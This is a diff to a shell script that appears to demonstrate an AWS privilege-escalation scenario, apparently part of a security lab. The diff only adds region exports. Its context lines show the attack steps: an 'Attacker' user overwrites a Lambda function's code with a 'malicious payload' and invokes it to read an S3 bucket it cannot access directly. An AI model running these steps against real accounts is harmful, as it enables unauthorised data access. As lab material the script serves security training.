@@ -124,6 +124,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -141,6 +142,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -150,6 +152,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to access target bucket (should fail)..."
 show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
 if aws s3 ls s3://$TARGET_BUCKET/ &> /dev/null; then
@@ -163,6 +166,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Getting target Lambda function details${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Target Lambda function: $TARGET_LAMBDA"
 
 show_cmd "ReadOnly" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --output json"
@@ -273,6 +277,7 @@ echo ""
 echo -e "${YELLOW}Step 9: Updating Lambda function code with malicious payload${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the privilege escalation vector - updating function code..."
 echo "Function: $TARGET_LAMBDA"
 
@@ -301,6 +306,7 @@ echo ""
 echo -e "${YELLOW}Step 10: Waiting for Lambda code update to reach Successful state...${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 MAX_WAIT=60
 WAITED=0
 while [ "$WAITED" -lt "$MAX_WAIT" ]; do
@@ -325,6 +331,7 @@ fi
 echo -e "${YELLOW}Step 11: Invoking Lambda function to read target S3 bucket${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Invoking function: $TARGET_LAMBDA"
 
 show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json"
